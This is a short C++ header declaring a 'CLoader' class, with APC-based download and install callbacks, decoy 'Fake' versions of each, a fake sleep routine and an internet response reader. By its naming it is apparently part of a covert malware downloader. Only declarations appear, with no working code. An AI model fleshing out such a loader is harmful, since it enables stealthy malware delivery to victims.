#pragma once

#include "../_Shared/InternetUtil.h"

/**  
 * \brief 
 */
class CLoader
{
public:
	__declspec(noinline) static void CALLBACK DownloadAPC(ULONG_PTR);
	__declspec(noinline) static DWORD CALLBACK FakeDownloadAPC(ULONG_PTR,ULONG_PTR,ULONG_PTR);

	__declspec(noinline) static void CALLBACK InstallAPC(ULONG_PTR);
	__declspec(noinline) static DWORD CALLBACK FakeInstallAPC(ULONG_PTR,ULONG_PTR,ULONG_PTR);

	__declspec(noinline) static DWORD CALLBACK FakeSleepEx(DWORD, BOOL);

	__declspec(noinline) static void InetReadResponse(HINTERNET hConn);

	__declspec(noinline) static int FakeLoad();
	__declspec(noinline) static int Load();

protected:
	static void RunMU();
	static CStdString MyBufferToHex(BYTE* buf, int len);

protected:
	static LPVOID s_pInetFile;
	static DWORD s_dwDlSize;
};